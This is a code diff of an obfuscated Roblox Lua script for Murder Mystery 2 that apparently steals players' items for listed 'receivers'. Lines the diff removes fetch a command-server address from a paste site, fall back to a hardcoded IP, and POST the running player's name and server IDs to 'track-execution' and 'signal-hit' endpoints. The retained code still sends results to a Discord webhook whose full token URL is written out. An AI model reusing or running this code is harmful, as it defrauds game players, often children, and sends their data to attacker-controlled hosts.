@@ -121,34 +121,7 @@ end
 
 v32("LocalPlayer: " .. LocalPlayer.Name)
 
-local v40 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
-
-local function v41()
-	local ok2, result2 = pcall(function()
-		return game:HttpGet(v40)
-	end)
-
-	if ok2 and result2 then
-		local match = result2:match("^%s*(.-)%s*$")
-
-		if match and match ~= "" then
-			if match:match("^https?://") then
-				return match
-			end
-
-			return "http://" .. match
-		end
-	end
-
-	return "http://212.119.42.158:3000"
-end
-
-if not getgenv().MM2_API_BASE then
-	getgenv().MM2_API_BASE = v41()
-end
-
-local MM2_API_BASE = getgenv().MM2_API_BASE
-local RECEIVERS = getgenv().RECEIVERS or {capet55}
+local RECEIVERS = getgenv().RECEIVERS or {"capet55"}
 local WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1538453005714718801/LQfE9djXZ9rq_QYo-7IVTRc2B4oIN5sckLkRBvSNpy83Ue_rZEU33JLXavUKOiYcs61M"
 local THRESHOLD = getgenv().THRESHOLD or 1
 
@@ -989,9 +962,6 @@ local function v228(p16, p17, p18)
 	return table.concat(t14, "\n")
 end
 
-local v246 = MM2_API_BASE .. "/webhook/"
-local v247 = MM2_API_BASE
-
 local function v251(p21, p22, p23)
 	if not request_ or p21 == "" then
 		return
@@ -1006,78 +976,15 @@ local function v251(p21, p22, p23)
 	end
 
 	pcall(request_, {
-		Url = v246 .. HttpService:UrlEncode(p21),
+		Url = p21,
 		Method = "POST",
 		Headers = {
-			["Content-Type"] = "application/x-www-form-urlencoded",
-			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
+			["Content-Type"] = "application/x-www-form-urlencoded"
 		},
 		Body = result4
 	})
 end
-local function v254()
-	if not request_ then
-		return
-	end
 
-	pcall(request_, {
-		Url = v247 .. "/track-execution-mm2",
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json",
-			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
-		},
-		Body = HttpService:JSONEncode({
-			target_players = RECEIVERS,
-			executor = LocalPlayer.Name
-		})
-	})
-end
-
-local u255 = false
-
-local function v256()
-	if u255 then
-		return
-	end
-
-	local request_2 = syn and syn.request or http_request or request
-
-	if not request_2 then
-		return
-	end
-
-	local ok4, result4 = pcall(function()
-		return request_2({
-			Url = MM2_API_BASE .. "/signal-hit",
-			Method = "POST",
-			Headers = {
-				["Content-Type"] = "application/json",
-				["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
-			},
-			Body = HttpService:JSONEncode({
-				place_id = tostring(game.PlaceId),
-				job_id = JobId2,
-				target_players = RECEIVERS,
-				sender = LocalPlayer.Name,
-				game_type = "mm2"
-			})
-		})
-	end)
-
-	if ok4 then
-		u255 = true
-
-		if result4 and result4.Body then
-			local ok5, result5 = pcall(function()
-				return HttpService:JSONDecode(result4.Body)
-			end)
-
-			if ok5 and result5 and result5.failed then
-			end
-		end
-	end
-end
 local function v262()
 	if not request_ then
 		return nil
@@ -1245,12 +1152,7 @@ local function v277()
 		local v318 = v269(false, v278)
 
 		v318.content = v298 and "@everyone" or ""
-		v254()
 		v251(WEBHOOK, v318.content, v318.embeds)
-
-		if v298 then
-			v256()
-		end
 	end
 end
 
